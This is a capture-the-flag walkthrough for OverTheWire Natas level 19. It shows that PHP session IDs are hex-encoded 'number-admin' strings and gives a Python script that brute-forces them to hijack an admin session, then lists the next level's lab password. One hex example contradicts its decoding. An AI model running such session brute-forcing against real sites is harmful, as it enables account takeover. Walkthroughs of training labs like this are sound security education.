# Natas CTF Solutions  

## Natas Level 19  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit session-based authentication using encoded PHP session IDs.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas19.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas19`  
- **Password:** Use the password from Natas Level 18:  
```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```  

![Home_Page](https://github.com/user-attachments/assets/0f831f53-5673-4dcb-978e-7544f34819e2)

---

### **Step 3: Analyze the Webpage**  
- When you try to log in with random credentials, it shows:  
```  
You are logged in as a regular user.  
```  
- Viewing the **page source** reveals that the session is handled by PHP’s `PHPSESSID` system.  
- The session ID is encoded using **hexadecimal** format.

![Session_ID](https://github.com/user-attachments/assets/0fc011e2-f719-41d6-bea5-88f055a8faa4)
  
---

### **Step 4: Hex Decode PHPSESSID**  
- After logging in, you’ll see a `PHPSESSID` value like:  
```
3237312d61646d696e
```  
- Use a tool like **CyberChef** to decode it:  
```
3238312d61646d696e → 281-admin
```
✅ The session ID is composed of:  
- `323831` = `281` (in hex)  
- `2d61646d696e` = `-admin` (in hex)  

![Cyberchef](https://github.com/user-attachments/assets/a49dba8e-97e2-4cf6-8dce-52049cfee906)

---

### **Step 5: Automate Session ID Brute Force**  
Use this Python script to brute-force the session ID:  

```python
import requests
from requests.auth import HTTPBasicAuth

# Authentication details
basicAuth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

MAX = 640  # PHP sessions typically have IDs up to 640
count = 1

u = "http://natas19.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    # Convert count to hex
    numberAsHex = "".join("{:02x}".format(ord(c)) for c in str(count))
    # Append '-admin' in hex
    adminPortion = "2d61646d696e" 

    # Construct session ID
    sessionID = "PHPSESSID=" + numberAsHex + adminPortion
    headers = {'Cookie': sessionID}

    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(f"[+] Found session ID: {sessionID}")
        print(response.text)
        break

    count += 1

print("Done!")
```

✅ **How the script works:**  
1. Converts `count` to hexadecimal.  
2. Appends the hex string for `-admin`.  
3. Sets it as a `PHPSESSID` value in the `Cookie` header.  
4. If the response does **not** show `"You are logged in as a regular user"`, it confirms the session is elevated to admin.  
5. Stops when a successful session ID is found.  

---

### **Step 6: Output**  
- After running the script, it finds a valid session ID — in this case, **281-admin** (hex: `3238312d61646d696e`).  
- Output example:  
```  
[+] Found session ID: PHPSESSID=3238312d61646d696e
You are logged in as an admin.
```

---

### **Step 7: Retrieve the Password**  
Once the session is authenticated as admin, the page reveals the password for **Natas Level 20**:  

![Password](https://github.com/user-attachments/assets/71c2fb0f-9c85-465e-9799-4bacf5bbd1b9)

---

### **✅ Password for Natas Level 20**  
```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```  

---

## 💡 **Lessons Learned**  
✔️ **Hex Encoding:** PHPSESSID values can be encoded using hex format.  
✔️ **Pattern Recognition:** Session IDs often follow a predictable pattern (like `number-admin`).  
✔️ **Brute Force with Pattern:** Once the pattern is known, brute force becomes efficient.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Session ID | ![Session_ID](https://github.com/user-attachments/assets/0fc011e2-f719-41d6-bea5-88f055a8faa4) |  
| Step 4 – Cyber Chef | ![Cyberchef](https://github.com/user-attachments/assets/a49dba8e-97e2-4cf6-8dce-52049cfee906) |  
| Step 7 – Found Password | ![Password](https://github.com/user-attachments/assets/71c2fb0f-9c85-465e-9799-4bacf5bbd1b9) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 20**:  
👉 [http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)  

---
